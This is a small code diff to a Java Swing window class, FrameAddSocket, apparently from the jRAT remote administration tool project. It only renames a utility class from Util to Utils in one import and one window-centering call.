@@ -24,7 +24,7 @@ import pro.jrat.common.crypto.Crypto;
 import pro.jrat.common.crypto.EncryptionKey;
 import pro.jrat.net.PortListener;
 import pro.jrat.ui.components.EncryptionKeyJTextField;
-import pro.jrat.utils.Util;
+import pro.jrat.utils.Utils;
 
 
 @SuppressWarnings("serial")
@@ -162,7 +162,7 @@ public class FrameAddSocket extends BaseFrame {
 					.addContainerGap())
 		);
 		contentPane.setLayout(gl_contentPane);
-		Util.center(this);
+		Utils.center(this);
 	}
 
 	public void addSocket() {
